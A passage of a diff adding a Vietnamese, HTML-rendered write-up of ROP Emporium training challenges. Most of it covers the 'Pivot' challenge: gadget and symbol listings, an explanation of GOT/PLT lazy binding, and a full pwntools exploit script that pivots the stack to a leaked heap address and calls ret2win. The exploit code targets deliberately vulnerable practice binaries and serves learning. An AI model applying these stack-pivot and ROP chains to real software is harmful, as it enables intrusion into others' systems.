+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">data_section_addrs</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">filename_index</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">bextr</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">index</span> <span class="o">-</span> <span class="mh">0x3ef2</span> <span class="o">-</span> <span class="n">current_rax</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">xlatb</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">stosb</span><span class="p">)</span>
+    <span class="n">current_rax</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">data_section_addrs</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">print_file_addrs</span><span class="p">)</span>
+
+<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+
+<h2>Pivot</h2>
+<p>Challenge 7 ta sẽ bị giới hạn số lượng bytes có thể overflow do đó ta cần chuyển hướng rsp - stack pointer đến vị trí khác để có thể thực thi</p>
+<p><img alt="" src="./images/ropemporium-2/Pivot/image.png"></p>
+<p>Ở challenge này tác giả đã khởi tạo 0x10000000 bytes bộ nhớ và cho địa chỉ tại stdout, ta chỉ cần chuyển hướng stack pointer đến địa chỉ này và sử dụng. </p>
+<p>Hàm memset sẽ chỉ cho phép 0x20 = 32 bytes trong bộ nhớ nên ta chỉ có thể overflow 32 bytes, vừa đủ để pivot stack.</p>
+<p><img alt="" src="./images/ropemporium-2/Pivot/1_image.png"></p>
+<p>Do giá trị trên sẽ thay đổi ở các lần thực thi (hàm malloc sẽ trả về giá trị khác nhau) và ta sẽ cần lấy giá trị đó để thay đổi giá trị trong payload trước khi truyền nên cần sử dụng thêm thư viện pwntools </p>
+<p>Payload 2: Lấy địa chỉ đã cho và chuyển hướng rsp tới đó</p>
+<p>Các gadget cần thiết</p>
+<div class="highlight"><pre><span></span><code>$ python3 Ropper.py -f pivot
+...
+0x00000000004009bb: pop rax<span class="p">;</span> ret<span class="p">;</span>
+0x00000000004009bd: xchg rax, rsp<span class="p">;</span> ret<span class="p">;</span>
+</code></pre></div>
+
+<p>Lấy input từ stdout và build stack</p>
+<div class="highlight"><pre><span></span><code><span class="n">line1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span><span class="w"></span>
+<span class="n">heap_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">int</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;pivot: (0x\w+)&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">line1</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="w"></span>
+
+<span class="n">payload2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4009bb</span><span class="p">)</span><span class="w"> </span><span class="c1">#0x00000000004009bb: pop rax; ret;</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">)</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4009bd</span><span class="p">)</span><span class="w"> </span><span class="c1"># 0x00000000004009bd: xchg rax, rsp; ret;</span><span class="w"></span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span><span class="w"></span>
+</code></pre></div>
+
+<p>Payload 1: Build ROP chain sẽ thực thi sau khi chuyển hướng</p>
+<div class="highlight"><pre><span></span><code><span class="w"> </span><span class="n">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">pivot</span><span class="w"></span>
+<span class="p">[</span><span class="n">Imports</span><span class="p">]</span><span class="w"></span>
+<span class="n">nth</span><span class="w"> </span><span class="n">vaddr</span><span class="w">      </span><span class="n">bind</span><span class="w">   </span><span class="n">type</span><span class="w">   </span><span class="n">lib</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
+<span class="err">―――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
+<span class="p">...</span><span class="w"></span>
+<span class="mi">2</span><span class="w">   </span><span class="mh">0x004006e0</span><span class="w"> </span><span class="n">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">       </span><span class="n">puts</span><span class="w"></span>
+<span class="mi">8</span><span class="w">   </span><span class="mh">0x00400720</span><span class="w"> </span><span class="n">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">       </span><span class="n">foothold_function</span><span class="w"></span>
+
+<span class="n">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">S</span><span class="w"> </span><span class="n">pivot</span><span class="w"></span>
+<span class="p">[</span><span class="n">Sections</span><span class="p">]</span><span class="w"></span>
+<span class="n">nth</span><span class="w"> </span><span class="n">paddr</span><span class="w">        </span><span class="n">size</span><span class="w"> </span><span class="n">vaddr</span><span class="w">       </span><span class="n">vsize</span><span class="w"> </span><span class="n">perm</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
+<span class="err">―――――――――――――――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
+<span class="p">...</span><span class="w"></span>
+<span class="mi">23</span><span class="w">  </span><span class="mh">0x00001028</span><span class="w">   </span><span class="mh">0x10</span><span class="w"> </span><span class="mh">0x00601028</span><span class="w">   </span><span class="mh">0x10</span><span class="w"> </span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="w"> </span><span class="p">.</span><span class="n">data</span><span class="w"></span>
+
+<span class="n">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">is</span><span class="w"> </span><span class="n">libpivot</span><span class="p">.</span><span class="n">so</span><span class="w"></span>
+<span class="p">...</span><span class="w"></span>
+<span class="p">[</span><span class="n">Symbols</span><span class="p">]</span><span class="w"></span>
+
+<span class="n">nth</span><span class="w"> </span><span class="n">paddr</span><span class="w">      </span><span class="n">vaddr</span><span class="w">      </span><span class="n">bind</span><span class="w">   </span><span class="n">type</span><span class="w">   </span><span class="n">size</span><span class="w"> </span><span class="n">lib</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
+<span class="err">―――――――――――――――――――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
+<span class="mi">10</span><span class="w">  </span><span class="mh">0x0000096a</span><span class="w"> </span><span class="mh">0x0000096a</span><span class="w"> </span><span class="n">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">   </span><span class="mi">19</span><span class="w">       </span><span class="n">foothold_function</span><span class="w"></span>
+<span class="mi">18</span><span class="w">  </span><span class="mh">0x00000a81</span><span class="w"> </span><span class="mh">0x00000a81</span><span class="w"> </span><span class="n">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">   </span><span class="mi">146</span><span class="w">      </span><span class="n">ret2win</span><span class="w"></span>
+
+<span class="n">$</span><span class="w"> </span><span class="n">readelf</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="n">pivot</span><span class="w"></span>
+<span class="n">Relocation</span><span class="w"> </span><span class="n">section</span><span class="w"> </span><span class="err">&#39;</span><span class="p">.</span><span class="n">rela</span><span class="p">.</span><span class="n">plt</span><span class="err">&#39;</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="mh">0x5c8</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="mi">9</span><span class="w"> </span><span class="n">entries</span><span class="o">:</span><span class="w"></span>
+<span class="w">  </span><span class="n">Offset</span><span class="w">          </span><span class="n">Info</span><span class="w">           </span><span class="n">Type</span><span class="w">           </span><span class="n">Sym</span><span class="p">.</span><span class="w"> </span><span class="n">Value</span><span class="w">    </span><span class="n">Sym</span><span class="p">.</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Addend</span><span class="w"></span>
+<span class="w">  </span><span class="p">...</span><span class="w"></span>
+<span class="mo">000000601020</span><span class="w">  </span><span class="mo">000200000007</span><span class="w"> </span><span class="n">R_X86_64_JUMP_SLO</span><span class="w"> </span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">puts</span><span class="p">@</span><span class="n">GLIBC_2</span><span class="mf">.2.5</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="mo">000000601040</span><span class="w">  </span><span class="mo">000</span><span class="mi">800000007</span><span class="w"> </span><span class="n">R_X86_64_JUMP_SLO</span><span class="w"> </span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">foothold_function</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+
+<span class="n">$</span><span class="w"> </span><span class="n">radare2</span><span class="w"> </span><span class="n">pivot</span><span class="w"></span>
+<span class="p">[</span><span class="mh">0x00400760</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="n">aaa</span><span class="w"></span>
+<span class="p">[</span><span class="mh">0x00400760</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="n">afl</span><span class="w"></span>
+<span class="p">[</span><span class="mh">0x00400760</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">foothold_function</span><span class="w"></span>
+<span class="p">[</span><span class="mh">0x00400720</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="n">pdf</span><span class="w"></span>
+<span class="w">    </span><span class="mh">0x00400720</span><span class="w">      </span><span class="n">ff251a092000</span><span class="w">   </span><span class="n">jmp</span><span class="w"> </span><span class="n">qword</span><span class="w"> </span><span class="p">[</span><span class="n">reloc</span><span class="p">.</span><span class="n">foothold_function</span><span class="p">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="p">[</span><span class="mh">0x601040</span><span class="o">:</span><span class="mi">8</span><span class="p">]</span><span class="o">=</span><span class="mh">0x400726</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="s">&quot;&amp;</span><span class="se">\a</span><span class="s">@&quot;</span><span class="w"></span>
+</code></pre></div>
+
+<p>Hàm ret2win không nằm trong binary mà nằm trong libpivot.so do đó ta cần tìm hiểu về lazy binding, để biết được địa chỉ của ret2win ta cần một hàm trong libpivot.so mà pivot gọi đó là foothold_function.</p>
+<p>Khi ta gọi đến foothold_function@plt tại 0x400720 lần đầu tiên, ta sẽ jump tới ptr và ptr này sẽ trỏ tới got.plt section, tại đây địa chỉ sẽ được resolve tới địa chỉ của libpivot.so và cập nhật vào got.plt. Lần gọi thứ 2 ta sẽ jump  tới trực tiếp hàm trong libpivot.so mà không cần resolve nữa</p>
+<p><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a></p>
+<p>Ví dụ:</p>
+<p>Khi ta gọi puts@plt (0x400872)</p>
+<p><img alt="" src="./images/ropemporium-2/Pivot/2_image.png"></p>
+<p>Jump tới got.plt</p>
+<p><img alt="" src="./images/ropemporium-2/Pivot/3_image.png"></p>
+<div class="highlight"><pre><span></span><code>$ readelf -r pivot
+Relocation section <span class="s1">&#39;.rela.plt&#39;</span> at offset 0x5c8 contains <span class="m">9</span> entries:
+  Offset          Info           Type           Sym. Value    Sym. Name + Addend
+  ...
+<span class="m">000000601020</span>  <span class="m">000200000007</span> R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> puts@GLIBC_2.2.5 + <span class="m">0</span>
+</code></pre></div>
+
+<p><img alt="" src="./images/ropemporium-2/Pivot/12_image.png"></p>
+<p>Lookup “put” trong GOT</p>
+<p><img alt="" src="./images/ropemporium-2/Pivot/5_image.png"></p>
+<p>Ta thấy địa chỉ 0x00007ffff7ffe2c0 nằm trong phần data của ld-linux-x86-64.so</p>
+<p><img alt="" src="./images/ropemporium-2/Pivot/6_image.png"></p>
+<p>0x00007ffff7fdd540 nằm trong execution của ld-linux-x86-64.so</p>
+<p><img alt="" src="./images/ropemporium-2/Pivot/10_image.png"></p>
+<p><img alt="" src="./images/ropemporium-2/Pivot/8_image.png"></p>
+<p>Khi ta call put@plt lần 2, got.plt sẽ trỏ đến put trong ld-linux-x86-64.so</p>
+<div class="highlight"><pre><span></span><code>$ readelf -r pivot
+Relocation section <span class="s1">&#39;.rela.plt&#39;</span> at offset 0x5c8 contains <span class="m">9</span> entries:
+  Offset          Info           Type           Sym. Value    Sym. Name + Addend
+  ...
+<span class="m">000000601020</span>  <span class="m">000200000007</span> R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> puts@GLIBC_2.2.5 + <span class="m">0</span>
+</code></pre></div>
+
+<p><img alt="" src="./images/ropemporium-2/Pivot/11_image.png"></p>
+<p>Như vậy để có được địa chỉ của hàm ret2win trong libpivot.so ta cần gọi hàm foothold_function 1 lần, lấy địa chỉ đã resolve của foothold_function trong got.plt và thêm vào offset khoảng cách giữa foothold_function và ret2win là ta sẽ có địa chỉ cần tìm.</p>
+<div class="highlight"><pre><span></span><code><span class="n">Stack</span><span class="w"> </span><span class="n">như</span><span class="w"> </span><span class="nl">sau</span><span class="p">:</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x400720</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">foothold_function</span><span class="nv">@plt</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x4009bb</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rax</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x601040</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">foothold_function</span><span class="nv">@got</span><span class="p">.</span><span class="n">plt</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">rax</span><span class="p">;</span><span class="w"> </span><span class="n">rax</span><span class="w"> </span><span class="n">lúc</span><span class="w"> </span><span class="n">này</span><span class="w"> </span><span class="n">trỏ</span><span class="w"> </span><span class="n">đến</span><span class="w"> </span><span class="n">địa</span><span class="w"> </span><span class="n">chỉ</span><span class="w"> </span><span class="n">của</span><span class="w"> </span><span class="n">foothold_function</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x4009c0</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">qword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rax</span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"> </span><span class="n">Lấy</span><span class="w"> </span><span class="n">địa</span><span class="w"> </span><span class="n">chỉ</span><span class="w"> </span><span class="n">của</span><span class="w"> </span><span class="n">foothold_function</span><span class="w"> </span><span class="n">đã</span><span class="w"> </span><span class="n">resolve</span><span class="w"></span>
+<span class="o">---&gt;</span><span class="w"> </span><span class="n">thêm</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="n">giữa</span><span class="w"> </span><span class="n">foothold</span><span class="w"> </span><span class="n">và</span><span class="w"> </span><span class="n">ret2win</span><span class="w"> </span><span class="n">để</span><span class="w"> </span><span class="n">rax</span><span class="w"> </span><span class="n">trỏ</span><span class="w"> </span><span class="n">về</span><span class="w"> </span><span class="n">ret2win</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x4007c8</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rbp</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x4009c4</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="k">add</span><span class="w"> </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">rbp</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="o">[</span><span class="n">0x4006b0</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="k">call</span><span class="w"> </span><span class="n">rax</span><span class="p">;</span><span class="w"> </span><span class="n">Gọi</span><span class="w"> </span><span class="n">ret2win</span><span class="w"></span>
+</code></pre></div>
+
+<p>Code payload 1</p>
+<div class="highlight"><pre><span></span><code><span class="n">lib_foothold_addrs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0000096a</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="mi">10</span><span class="w">  </span><span class="mh">0x0000096a</span><span class="w"> </span><span class="mh">0x0000096a</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">   </span><span class="mi">19</span><span class="w">       </span><span class="n">foothold_function</span><span class="w"></span>
+<span class="n">lib_ret2win_addrs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00000a81</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="mi">18</span><span class="w">  </span><span class="mh">0x00000a81</span><span class="w"> </span><span class="mh">0x00000a81</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">   </span><span class="mi">146</span><span class="w">      </span><span class="n">ret2win</span><span class="w"></span>
+
+<span class="n">payload1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400720</span><span class="p">)</span><span class="w"> </span><span class="n">#8</span><span class="w">   </span><span class="mh">0x00400720</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">       </span><span class="n">foothold_function</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4009bb</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="mh">0x00000000004009bb</span><span class="err">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rax</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x601040</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="mi">6</span><span class="err">:</span><span class="w"> </span><span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">foothold_function</span><span class="w"> </span><span class="p">();</span><span class="w"> </span><span class="mh">0x00400720</span><span class="w">      </span><span class="n">ff251a092000</span><span class="w">   </span><span class="n">jmp</span><span class="w"> </span><span class="n">qword</span><span class="w"> </span><span class="o">[</span><span class="n">reloc.foothold_function</span><span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">[</span><span class="n">0x601040:8</span><span class="o">]=</span><span class="mh">0x400726</span><span class="p">;</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4009c0</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="mh">0x00000000004009c0</span><span class="err">:</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">qword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rax</span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4007c8</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="mh">0x00000000004007c8</span><span class="err">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rbp</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="n">lib_ret2win_addrs</span><span class="o">-</span><span class="n">lib_foothold_addrs</span><span class="p">)</span><span class="w"> </span><span class="n">#offset</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4009c4</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="mh">0x00000000004009c4</span><span class="err">:</span><span class="w"> </span><span class="k">add</span><span class="w"> </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">rbp</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4006b0</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="mh">0x00000000004006b0</span><span class="err">:</span><span class="w"> </span><span class="k">call</span><span class="w"> </span><span class="n">rax</span><span class="p">;</span><span class="w"></span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span><span class="w"></span>
+</code></pre></div>
+
+<p>Kết hợp 2 payload</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pivot&#39;</span><span class="p">)</span>
+<span class="c1"># gdb.attach(p,&#39;&#39;&#39;</span>
+<span class="c1"># break *pwnme</span>
+<span class="c1"># &#39;&#39;&#39;)</span>
+
+<span class="n">line1</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">line1</span><span class="p">)</span>
+<span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;pivot: (0x\w+)&#39;</span><span class="p">,</span> <span class="n">line1</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Found heap address: </span><span class="si">{:02x}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>
+
+<span class="n">lib_foothold_addrs</span> <span class="o">=</span> <span class="mh">0x0000096a</span> <span class="c1"># 10  0x0000096a 0x0000096a GLOBAL FUNC   19       foothold_function</span>
+<span class="n">lib_ret2win_addrs</span> <span class="o">=</span> <span class="mh">0x00000a81</span> <span class="c1"># 18  0x00000a81 0x00000a81 GLOBAL FUNC   146      ret2win</span>
+
+<span class="n">payload1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400720</span><span class="p">)</span> <span class="c1">#8   0x00400720 GLOBAL FUNC       foothold_function</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4009bb</span><span class="p">)</span> <span class="c1"># 0x00000000004009bb: pop rax; ret;</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601040</span><span class="p">)</span> <span class="c1"># 6: sym.imp.foothold_function (); 0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726;</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4009c0</span><span class="p">)</span> <span class="c1"># 0x00000000004009c0: mov rax, qword ptr [rax]; ret;</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4007c8</span><span class="p">)</span> <span class="c1"># 0x00000000004007c8: pop rbp; ret;</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">lib_ret2win_addrs</span><span class="o">-</span><span class="n">lib_foothold_addrs</span><span class="p">)</span> <span class="c1">#offset</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4009c4</span><span class="p">)</span> <span class="c1"># 0x00000000004009c4: add rax, rbp; ret;</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006b0</span><span class="p">)</span> <span class="c1"># 0x00000000004006b0: call rax;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+
+<span class="n">line2</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">line2</span><span class="p">)</span>
+
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4009bb</span><span class="p">)</span> <span class="c1">#0x00000000004009bb: pop rax; ret;</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4009bd</span><span class="p">)</span> <span class="c1"># 0x00000000004009bd: xchg rax, rsp; ret;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+
+<span class="n">line3</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;libpivot&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">line3</span><span class="p">)</span>
+
+<span class="c1"># leak_foothold_got = p.recv(8)</span>
+<span class="c1"># print(leak_foothold_got.hex())</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+
+<span class="c1"># p.interactive()</span>
+</code></pre></div>
+
+<h2>Ret2csu</h2>
+<p>Challenge 8 tương tự Challenge 3 Callme, tuy nhiên ta sẽ sử dụng phương pháp khác để lấy kiểm soát các giá trị rdi, rsi, rdx (3 thanh ghi  chứa tham số arg1, arg2, arg3)</p>
